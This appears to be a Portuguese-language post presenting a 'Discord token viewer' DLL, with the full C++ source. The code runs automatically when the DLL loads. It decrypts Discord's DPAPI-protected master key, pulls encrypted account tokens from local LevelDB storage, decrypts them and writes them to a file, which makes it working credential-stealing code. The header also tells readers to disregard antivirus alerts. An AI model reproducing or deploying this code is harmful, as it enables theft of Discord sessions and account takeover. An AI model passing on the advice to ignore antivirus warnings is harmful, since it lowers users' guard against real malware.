mostra seu token no discord mais informações no ZIP ATENÇÃO VAI DAR SIM ALERTA DE VÍRUS MAS ISSO NÃO É UM MALWARE NA COMPOSIÇÃO DE SEU CÓDIGO TEM FERRAMENTAS DE CRIPTOGRAFIA E ACESSAR A APPDATA O QUE PODE SER CONSIDERADO POR ANTIVIRUS UM LADRÃO MAS NÃO É VÍRUS AQUI ESTÁ O CÓDIGO ORIGINAL DA DLL TOKEN PARA ANALISAREM
#define _CRT_SECURE_NO_WARNINGS
#include <windows.h>
#include <wincrypt.h>
#include <openssl/evp.h>
#include <openssl/aes.h>
#include <iostream>
#include <fstream>
#include <vector>
#include <string>
#include <filesystem>

#pragma comment(lib, "crypt32.lib")
namespace fs = std::filesystem;

// Função para decodificar Base64 usando a API do Windows
std::vector<BYTE> Base64Decode(const std::string& input) {
    DWORD dwLen = 0;
    CryptStringToBinaryA(input.c_str(), 0, CRYPT_STRING_BASE64, NULL, &dwLen, NULL, NULL);
    std::vector<BYTE> data(dwLen);
    CryptStringToBinaryA(input.c_str(), 0, CRYPT_STRING_BASE64, data.data(), &dwLen, NULL, NULL);
    return data;
}

// Descriptografa a Master Key do Local State
std::vector<BYTE> DecryptMasterKey(const std::vector<BYTE>& encryptedKey) {
    DATA_BLOB input, output;
    if (encryptedKey.size() < 5) return {};
    input.pbData = const_cast<BYTE*>(encryptedKey.data() + 5); // Pula o prefixo "DPAPI"
    input.cbData = static_cast<DWORD>(encryptedKey.size() - 5);

    if (CryptUnprotectData(&input, NULL, NULL, NULL, NULL, 0, &output)) {
        std::vector<BYTE> key(output.pbData, output.pbData + output.cbData);
        LocalFree(output.pbData);
        return key;
    }
    return {};
}

// Descriptografa o token AES-256-GCM
std::string DecryptToken(const std::vector<BYTE>& ciphertext, const std::vector<BYTE>& masterKey) {
    if (ciphertext.size() < 31) return "Ciphertext muito curto"; // 3 prefix + 12 IV + data + 16 Tag

    EVP_CIPHER_CTX* ctx = EVP_CIPHER_CTX_new();
    const BYTE* iv = ciphertext.data() + 3;
    const BYTE* actual_ciphertext = ciphertext.data() + 15;
    int ciphertext_len = (int)ciphertext.size() - 15 - 16;
    const BYTE* tag = ciphertext.data() + ciphertext.size() - 16;

    std::vector<unsigned char> plaintext(ciphertext_len + 1, 0);
    int len, plaintext_len = 0;

    EVP_DecryptInit_ex(ctx, EVP_aes_256_gcm(), NULL, NULL, NULL);
    EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_SET_TAG, 16, (void*)tag);
    EVP_DecryptInit_ex(ctx, NULL, NULL, masterKey.data(), iv);

    if (EVP_DecryptUpdate(ctx, plaintext.data(), &len, actual_ciphertext, ciphertext_len) > 0) {
        plaintext_len = len;
        if (EVP_DecryptFinal_ex(ctx, plaintext.data() + len, &len) > 0) {
            plaintext_len += len;
            EVP_CIPHER_CTX_free(ctx);
            return std::string((char*)plaintext.data(), plaintext_len);
        }
    }

    EVP_CIPHER_CTX_free(ctx);
    return "[Erro na Descriptografia]";
}

void MainAction() {
    char* appDataPtr = nullptr;
    size_t sz = 0;
    _dupenv_s(&appDataPtr, &sz, "APPDATA");
    if (!appDataPtr) return;

    std::string discordPath = std::string(appDataPtr) + "\\discord";
    std::string localStatePath = discordPath + "\\Local State";
    std::string leveldbPath = discordPath + "\\Local Storage\\leveldb";
    free(appDataPtr);

    std::ofstream log("debug_log.txt"); // Verifique este arquivo se nada acontecer
    std::ofstream result("token_encontrado.txt");

    // 1. Obter a Chave Mestra
    std::ifstream is(localStatePath);
    if (!is.is_open()) {
        log << "ERRO: Nao abriu Local State" << std::endl;
        return;
    }
    std::string jsonContent((std::istreambuf_iterator<char>(is)), std::istreambuf_iterator<char>());
    size_t keyPos = jsonContent.find("\"encrypted_key\":\"");
    if (keyPos == std::string::npos) {
        log << "ERRO: encrypted_key nao encontrada no JSON" << std::endl;
        return;
    }

    std::string encKeyB64 = jsonContent.substr(keyPos + 17, jsonContent.find("\"", keyPos + 17) - (keyPos + 17));
    std::vector<BYTE> masterKey = DecryptMasterKey(Base64Decode(encKeyB64));

    if (masterKey.empty()) {
        log << "ERRO: Falha ao descriptografar Master Key via DPAPI" << std::endl;
        return;
    }

    // 2. Buscar Tokens no LevelDB
    if (!fs::exists(leveldbPath)) {
        log << "ERRO: Pasta LevelDB nao existe" << std::endl;
        return;
    }

    for (const auto& entry : fs::directory_iterator(leveldbPath)) {
        std::string ext = entry.path().extension().string();
        if (ext == ".ldb" || ext == ".log") {
            // Copia para evitar erro de arquivo em uso
            std::string tempFile = "temp_scan.tmp";
            fs::copy_file(entry.path(), tempFile, fs::copy_options::overwrite_existing);

            std::ifstream file(tempFile, std::ios::binary);
            std::string data((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
            file.close();
            fs::remove(tempFile);

            size_t pos = 0;
            while ((pos = data.find("dQw4w9WgXcQ:", pos)) != std::string::npos) {
                size_t end = data.find("\"", pos);
                if (end != std::string::npos) {
                    std::string encTokenB64 = data.substr(pos + 12, end - (pos + 12));
                    std::string decrypted = DecryptToken(Base64Decode(encTokenB64), masterKey);
                    result << "Token Encontrado: " << decrypted << std::endl;
                }
                pos = (end == std::string::npos) ? pos + 1 : end;
            }
        }
    }
    log << "Processo finalizado com sucesso." << std::endl;
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    if (ul_reason_for_call == DLL_PROCESS_ATTACH) {
        CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)MainAction, NULL, 0, NULL);
    }
    return TRUE;
}
